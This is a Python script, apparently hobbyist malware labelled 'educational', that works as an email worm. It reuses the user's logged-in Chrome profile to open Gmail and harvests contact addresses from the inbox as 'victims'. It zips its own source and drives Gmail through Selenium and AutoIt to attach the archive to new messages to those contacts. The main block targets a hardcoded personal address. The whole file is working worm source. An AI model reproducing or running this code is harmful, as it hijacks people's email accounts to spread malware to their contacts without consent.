import pyautogui
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from PySide2 import QtCore, QtWidgets
import os
import sys
import shutil
from chromedriver_py import binary_path
import time
from selenium.webdriver.common.action_chains import ActionChains
import autoit

file_path = os.getcwd()
file_path = file_path.split('\\')
user = file_path[2]


def never_ever_use_this_spreading_mechanism():
    subject = "this is a virus don't open"
    text = "this is a worm created for educational purposes only. do not download the files. by downloading, " \
           "you consent to take any responsibility for damages caused by this malware to you or any other person"

    driver = open_chrome()
    print("opened browser")
    file_path = os.getcwd()
    print("got file path")
    app = QtWidgets.QApplication(sys.argv)
    print("created app")
    dst = fr"C:\Users\{user}\Desktop\breh"
    os.makedirs(dst)
    print("made dir: " + dst)
    shutil.copy(file_path + "\main.py", dst)
    shutil.make_archive("package", 'zip', dst)
    file_to_clipboard(file_path + "\package.zip", app)
    for i in get_victims(driver):
        send_gmail(i, subject, text, driver)


def no_dup(lst):
    new_lst = []
    for i in lst:
        if not (i in new_lst):
            new_lst.append(i)
    return new_lst


def open_chrome():
    options = webdriver.ChromeOptions()
    options.add_argument(fr"user-data-dir=C:\Users\{user}\AppData\Local\Google\Chrome\User Data")
    driver = webdriver.Chrome(chrome_options=options, executable_path=binary_path)
    driver.get("https://mail.google.com/mail/u/0/?ogbl#inbox")
    return driver


def get_victims(driver):
    email_lst = []
    element_lst = driver.find_elements_by_class_name("yP")
    for i in element_lst:
        email_lst.append(i.get_attribute("email"))
    return no_dup(email_lst)


def send_gmail(to, subject, msg, driver):
    elem = driver.find_element_by_xpath('//div[@class="T-I T-I-KE L3"]')
    elem.click()
    element = driver.find_element_by_name("to")
    type_slowly_to_element(to, element)
    element = driver.find_element_by_name("subjectbox")
    type_slowly_to_element(subject, element)
    elem = driver.find_element_by_xpath('//div[@class="Am Al editable LW-avf tS-tW"]')
    type_slowly_to_element(msg, elem)
    file_path = os.getcwd() + "\package.zip"
    elem = driver.find_element_by_xpath('//div[@class="a1 aaA aMZ"]')
    elem.click()
    print("opened shit")
    time.sleep(0.5)
    autoit.win_active("Open")
    autoit.control_set_text("Open", "Edit1", os.getcwd() + r"\package.zip")
    print("added the file")
    autoit.control_send("Open", "Edit1", "{ENTER}")
    print("sent file")

    # elem.click()
    # paste(driver, elem)
    # paste_kb()
    # elem.send_keys(Keys.CONTROL, "v")


    # print("trying to copy")  # copying worm to gmail
    # element.send_keys(Keys.TAB)
    # print("pressed tab")
    # kb.write(msg)
    # print("wrote msg")
    # paste_kb()
    # print("pasted")

    # elem = driver.find_element_by_xpath('//div[@class="T-I J-J5-Ji aoO v7 T-I-atl L3 T-I-KL"]')  # sending messege
    # print("found send button")
    # elem.click()
    # print("sent")


def paste(driver, elem):
    actions = ActionChains(driver)
    actions.move_to_element(elem)
    actions.click(elem)  # select the element where to paste text
    actions.key_down(Keys.CONTROL)
    actions.key_down('v')
    actions.key_up('v')
    actions.key_up(Keys.CONTROL)
    actions.perform()


def paste_kb():
    pyautogui.keyDown('Ctrl')
    pyautogui.press('v')
    pyautogui.keyUp('Ctrl')
    # pyautogui.hotkey('ctrl', 'v')
    # kb.press('ctrl')
    # kb.press('v')
    # kb.release('v')
    # kb.release('ctrl')


def type_slowly_to_element(msg, element):
    for i in msg:
        element.send_keys(i)
        time.sleep(0.07)


def file_to_clipboard(path, app):
    print("start copy")
    print("created app")
    data = QtCore.QMimeData()
    url = QtCore.QUrl.fromLocalFile(path)
    data.setUrls([url])

    cb = app.clipboard()
    cb.clear()
    cb.setMimeData(data)
    print("deleting app")

    print("app deleted")


if __name__ == "__main__":
    subject = "bruh"
    text = "bruh"

    driver = open_chrome()
    print("opened browser")
    file_path = os.getcwd()
    print("got file path")
    app = QtWidgets.QApplication(sys.argv)
    print("created app")
    dst = fr"C:\Users\{user}\Desktop\breh"
    os.makedirs(dst)
    print("made dir: " + dst)
    shutil.copy(file_path + "\main.py", dst)
    shutil.make_archive("package", 'zip', dst)
    # pyperclip.copy(file_path + "\package.zip")
    send_gmail("eilon.ko@gmail.com", subject, text, driver)
